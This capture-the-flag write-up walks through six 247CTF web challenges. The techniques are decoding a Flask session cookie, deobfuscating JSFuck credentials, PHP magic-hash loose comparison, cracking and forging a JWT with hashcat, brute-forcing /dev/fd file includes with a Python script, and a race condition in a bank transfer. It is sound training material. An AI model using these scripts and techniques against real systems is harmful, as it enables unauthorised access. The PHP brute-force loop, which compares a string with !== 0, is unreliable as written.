## Secured Session

When we access we can see a python code

```python
import os
from flask import Flask, request, session
from flag import flag

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

def secret_key_to_int(s):
    try:
        secret_key = int(s)
    except ValueError:
        secret_key = 0
    return secret_key

@app.route("/flag")
def index():
    secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
    session['flag'] = flag
    if secret_key == app.config['SECRET_KEY']:
      return session['flag']
    else:
      return "Incorrect secret key!"

@app.route('/')
def source():
    return "

%s

" % open(__file__).read()

if __name__ == "__main__":
    app.run()
```

The code is running Flask and a session cookie with the flag value is created when we try to access to the flag directory.

```python
session = eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0.ZRWPwQ.R0Boj10gQjGY50pBou4TZ1B-ZSo
```

Seems encoded in base64, let’s decode it.

```python
{"flag":{" b":"MjQ3Q1RGe2RhODA3OTVmOGE1Y2FiMmUwMzdkNzM4NTgwN2I5YTkxfQ=="}}EcA=tc)MA
```

The flag is encoded too.

> 247CTF{…}
> 

## Trusted Client

The CTF description leaks you that the website saves the credentials client side but well obfuscated.

When we access we can see a form and somehow we need to find the obfuscated creds.

![Untitled](/CTF/24ctf-1.png)

Checking the web source we can see that it’s using JSFuck in order to obfuscate.

```jsx
window.onload=function() {
  document.getElementById('login').onsubmit=function() {

  return false;
  }
}
```

> **JSFuck** is an esoteric subset of JavaScript, where code is written using only six characters, !, and +.
> 

So I am going to deobfuscate the script, you can do it [here](https://enkhee-osiris.github.io/Decoder-JSFuck/).

```jsx
if (this.username.value == 'the_flag_is' && this.password.value == '247CTF{}'){ alert('Valid username and password!'); } else { alert('Invalid username and password!'); }
```

> 247CTF{…}
> 

## Compare the Pair

The website shows a php code

```php
<?php
  require_once('flag.php');
  $password_hash = "0e902564435691274142490923013038";
  $salt = "f789bbc328a3d1a3";
  if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){
    echo $flag;
  }
  echo highlight_file(__FILE__, true);
?>
```

I tried to crack it with john but failed

The code is using a loose comparison when compares the password with the hash. 

In php the == operator performs a loose equality comparison that performs type coercion if necessary to make the comparison possible. 

```php
$num1 = 5;
$num2 = "5";

if ($num1 == $num2) {
    echo "Equal";
} else {
    echo "Not Equal";
}
```

**This code outputs “Equal”**

The === operator, on the other hand, performs a strict equality comparison that does not perform type coercion and requires the operands to have the same type (as well as the same value). 

```php
$num1 = 5;
$num2 = "5";

if ($num1 === $num2) {
    echo "Equal";
} else {
    echo "Not Equal";
}
```

**This code outputs “Not Equal”**

The thing is as we are checking if the hash which is a string is equal to something and the hash starts with `0e + numbers` which in php is equal to 0, we can brute force password variable in order to get something which starts with 0e + numbers.

```php
<?php
    $salt = "f789bbc328a3d1a3";
    $x = 1;
    while(md5($salt . $x) !== 0)
    {
        $x++;
    }
    echo $x;
?>
```

I have build the above code in order to perform the attack.

```
Output: 237701818
```

> 247CTF{…}
> 

## Flag Authoriser

```python
from flask import Flask, redirect, url_for, make_response, render_template, flash
from flask_jwt_extended import JWTManager, create_access_token, jwt_optional, get_jwt_identity
from secret import secret, admin_flag, jwt_secret

app = Flask(__name__)
cookie = "access_token_cookie"

app.config['SECRET_KEY'] = secret
app.config['JWT_SECRET_KEY'] = jwt_secret
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['DEBUG'] = False

jwt = JWTManager(app)

def redirect_to_flag(msg):
    flash('%s' % msg, 'danger')
    return redirect(url_for('flag', _external=True))

@jwt.expired_token_loader
def my_expired_token_callback():
    return redirect_to_flag('Token expired')

@jwt.invalid_token_loader
def my_invalid_token_callback(callback):
    return redirect_to_flag(callback)

@jwt_optional
def get_flag():
    if get_jwt_identity() == 'admin':
        return admin_flag

@app.route('/flag')
def flag():
    response = make_response(render_template('main.html', flag=get_flag()))
    response.set_cookie(cookie, create_access_token(identity='anonymous'))
    return response

@app.route('/')
def source():
    return "

%s

" % open(__file__).read()

if __name__ == "__main__":
    app.run()
```

The python script is using Flask and JWT, JSON Web Token is a stateless method of securely transmitting information between parties as a JSON object. 

JWT is composed by three parts:

- Header : consists of two parts, the type of the token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA.
- Payload : The second part of the token is the payload in our case the scripts saves here stuff as the identity.
- Signature : To create the signature part you have to take the encoded header in base64, the encoded payload in base64, a secret, and sign that with the algorithm specified in the header.
    
    `xxxxx.yyyyy.zzzzz`
    

In the flag directory is rendered a html and the html is getting a flag variable which gets the output of the following function

```python
def get_flag():
    if get_jwt_identity() == 'admin':
        return admin_flag
```

This scripts returns the flag if the JWT identity is set as admin.

Also, when we access to the flag directory a JWT cookie is set as anonymous.

```json
access_token_cookie: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiNzdhYTJjY2ItNjhmYi00MDRjLTlmZjktZDhlZGQzZjAxNDliIiwianRpIjoiMTAxNzUyMmUtMjc1NS00Nzc5LTk3MjItZWNjMjBiZDBkMGU1IiwiZXhwIjoxNjk1OTE4NTMxLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5NTkxNzYzMSwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTY5NTkxNzYzMSwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.ZOrJhpDxgUIlBvTCWdWW8Ru-YELU_a4ywIaZs1kqyMY
```

Let’s decode it, you can do it [here](https://jwt.io/#debugger-io)

### HEADER

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### PAYLOAD

```json
{
  "csrf": "77aa2ccb-68fb-404c-9ff9-d8edd3f0149b",
  "jti": "1017522e-2755-4779-9722-ecc20bd0d0e5",
  "exp": 1695918531,
  "fresh": false,
  "iat": 1695917631,
  "type": "access",
  "nbf": 1695917631,
  "identity": "anonymous"
}
```

### SIGNATURE

```json
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload), secret)
```

HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. So  we can take advantage of this and try to brute force it with hashcat.

```json
hashcat -a 0 -m 16500 <jwt> rockyou.txt
```

```
Output: wepwn247
```

Now we can set the identity value as admin and craft a new token with the JWT debugger.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiNzRiMjAwZDktYjI0NS00ZjY3LTg4NDQtZWI5MDEzODZmNmY5IiwianRpIjoiMjMwMTgwNzQtMDUyNC00Mzc2LTk3MzItYjBiYjZhMzUzY2RlIiwiZXhwIjoxNjk1OTIwMjcyLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5NTkxOTM3MiwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTY5NTkxOTM3MiwiaWRlbnRpdHkiOiJhZG1pbiJ9.POjUbsRPsPZ0ahbiT0mXX7WuLreuU9mZTzPnn8XcKyU
```

Once the cookie is updated only rests to access to the flag directory again.

## Forgotten File Pointer

In this level we are dealing with file descriptors. As we know in linux EVERYHING is a file, the opened files have one unique id most known as file descriptor.

```php
<?php
  $fp = fopen("/tmp/flag.txt", "r");
  if($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['include']) && strlen($_GET['include']) <= 10) {
    include($_GET['include']);
  }
  fclose($fp);
  echo highlight_file(__FILE__, true);
?>
```

Checking the php code we can see that is asking for one parameter to include it the source.

Easily we can think that putting the flag file leaked on the same code is gonna work but unfortunately there is a string size limit for the parameter.

In order to not exceed the limit I realized that, as the flag file is opened, there is file descriptor for it. So I write the following script in order to brute force each file in fd directory.

```python
#!/usr/bin/python3 
import requests

id = 0

while True:
    url = f"https://eb90cdb8b1b2ea70.247ctf.com/?include=/dev/fd/{id}"
    r = requests.get(url)
    if "247CTF" in r.text:
        print(id)
        break
    else:
        id += 1

```

The code check if there is 24CTF on the file and outputs the id once found.

```
Output: 10
```

> 247CTF{…}
> 

## Acid Flag Bank

This CTF is about race condition attacks. The race condition occurs ****when two or more asynchronously running pieces of code can access and change a shared resource

```php
<?php
require_once('flag.php');

class ChallDB
{
    public function __construct($flag)
    {
        $this->pdo = new SQLite3('/tmp/users.db');
        $this->flag = $flag;
    }
 
    public function updateFunds($id, $funds)
    {
        $stmt = $this->pdo->prepare('update users set funds = :funds where id = :id');
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->bindValue(':funds', $funds, SQLITE3_INTEGER);
        return $stmt->execute();
    }

    public function resetFunds()
    {
        $this->updateFunds(1, 247);
        $this->updateFunds(2, 0);
        return "Funds updated!";
    }

    public function getFunds($id)
    {
        $stmt = $this->pdo->prepare('select funds from users where id = :id');
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt->execute();
        return $result->fetchArray(SQLITE3_ASSOC)['funds'];
    }

    public function validUser($id)
    {
        $stmt = $this->pdo->prepare('select count(*) as valid from users where id = :id');
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt->execute();
        $row = $result->fetchArray(SQLITE3_ASSOC);
        return $row['valid'] == true;
    }

    public function dumpUsers()
    {
        $result = $this->pdo->query("select id, funds from users");
        echo "<pre>";
        echo "ID FUNDS\n";
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            echo "{$row['id']}  {$row['funds']}\n";
        }
        echo "</pre>";
    }

    public function buyFlag($id)
    {
        if ($this->validUser($id) && $this->getFunds($id) > 247) {
            return $this->flag;
        } else {
            return "Insufficient funds!";
        }
    }

    public function clean($x)
    {
        return round((int)trim($x));
    }
}

$db = new challDB($flag);
if (isset($_GET['dump'])) {
    $db->dumpUsers();
} elseif (isset($_GET['reset'])) {
    echo $db->resetFunds();
} elseif (isset($_GET['flag'], $_GET['from'])) {
    $from = $db->clean($_GET['from']);
    echo $db->buyFlag($from);
} elseif (isset($_GET['to'],$_GET['from'],$_GET['amount'])) {
    $to = $db->clean($_GET['to']);
    $from = $db->clean($_GET['from']);
    $amount = $db->clean($_GET['amount']);
    if ($to !== $from && $amount > 0 && $amount <= 247 && $db->validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) {
        $db->updateFunds($from, $db->getFunds($from) - $amount);
        $db->updateFunds($to, $db->getFunds($to) + $amount);
        echo "Funds transferred!";
    } else {
        echo "Invalid transfer request!";
    }
} else {
    echo highlight_file(__FILE__, true);
}
```

In the above php code we have a class called ChallDB which has functions to manage a bank SQL database.

The most relevant class function is the `buyFlag($id)` which if the id passed have more than 247 in his bank balance, the function outputs the flag.

```php
public function buyFlag($id)
    {
        if ($this->validUser($id) && $this->getFunds($id) > 247) {
            return $this->flag;
        } else {
            return "Insufficient funds!";
        }
    }
```

The app functionalities are the following:

1. Get user’s id and their money 
2.  Reset the amount value 
3. Buy the flag 
4. Transfer money

We can use the first one by accessing to `/?dump` 

```html
ID FUNDS
1  247
2  0
```

The user 1 has 247 and the user 2 has no money.

The second one is used by accessing to `/?reset`, the user’s balance return to default value.

To buy the flag we need to put the following parameters `/?flag&from=id`, as the name suggests we buy the flag. This functionality works with the buyflag($id) ChallDB function.

If we want to transfer the money we need to specify the parameters `/?from=id&to=id2&amount=x`

Let’s focus on the last one

```php
} elseif (isset($_GET['to'],$_GET['from'],$_GET['amount'])) {
    $to = $db->clean($_GET['to']);
    $from = $db->clean($_GET['from']);
    $amount = $db->clean($_GET['amount']);
    if ($to !== $from && $amount > 0 && $amount <= 247 && $db->validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) {
        $db->updateFunds($from, $db->getFunds($from) - $amount);
        $db->updateFunds($to, $db->getFunds($to) + $amount);
        echo "Funds transferred!";
    } else {
        echo "Invalid transfer request!";
    }
```

The server checks if the two users are valid one after that checks if the sending user has enough money if all worked well. The money is updated in the two accounts an a message is displayed.

This code doesn’t prevent a race condition attack due to the fact that while a transaction is being made, another transaction can check if the user has money and when the first transaction finished and the user lacks of money, the money will still be adding to the user to:

```php
 $db->updateFunds($from, $db->getFunds($from) - $amount);
 $db->updateFunds($to, $db->getFunds($to) + $amount);
```

With tools as BurpSuite you can perform multiple transactions at the same time till the money exceed the initial amount.

> 247CTF{…}
